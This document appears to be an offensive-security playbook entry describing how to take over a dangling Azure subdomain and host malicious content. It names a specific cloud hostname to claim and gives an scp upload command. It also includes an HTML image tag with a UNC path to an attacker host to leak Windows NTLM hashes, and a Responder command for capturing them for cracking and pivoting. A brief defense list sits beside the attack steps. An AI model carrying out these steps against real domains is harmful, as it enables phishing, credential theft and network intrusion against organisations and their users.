---
tags:
  - subdomain-takeover
  - malicious-hosting
  - ntlm-relay
type: procedure
tools:
  - '[[tools/Responder]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Azure
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:51:26.763Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 9fb7e4c8-9a65-4843-a93f-700fecf46932
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Perform-Subdomain-Takeover-and-Host-Content

## Summary

This procedure claims a vulnerable subdomain by taking over the dangling cloud resource and hosts malicious content, including setups for phishing or NTLM hash capture.

## Description

Exploiting the confirmed dead Azure endpoint, the attacker registers or repurposes the resource to point to their server. Content like HTML with UNC paths in images triggers Windows hash capture. Outcomes: Full control for phishing or relay attacks. Requires Azure access or equivalent for claim.

## Requirements

1. Access to claim the cloud resource (e.g., Azure account)
2. Hosting server for content
3. Responder for hash capture

## Defense

Defensive measures and detection strategies:

- Automate resource deletion and DNS cleanup in CI/CD
- Monitor for unauthorized subdomain resolutions via certificate logs
- Block UNC paths and enable SMB signing to prevent NTLM relay

## Objectives

1. Gain control of subdomain
2. Host proof-of-concept malicious payloads
3. Capture credentials via relay

## Instructions

### Step 1: Claim the Resource

**Context**: Take over the dead Azure CloudApp.

No command; use Azure portal to create a new VM or app service at the dangling name s00307dpipsvcardproxy00.eastus.cloudapp.azure.com, updating DNS if needed.

> Subdomain now resolves to attacker content.

### Step 2: Host Malicious Content

**Context**: Upload HTML with embedded malicious elements.

Upload file via SCP or git to server:

```bash
scp index.html user@attacker-server:/var/www/html/
```

Include <img src="\\attacker.com\share\image.jpg"> to trigger Responder on Windows viewers.

> Launches Responder: python Responder.py -I eth0, capturing NTLM hashes for cracking and VPN pivoting.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Responder]]

## Tags

- [[subdomain-takeover]]
- [[ntlm-relay]]
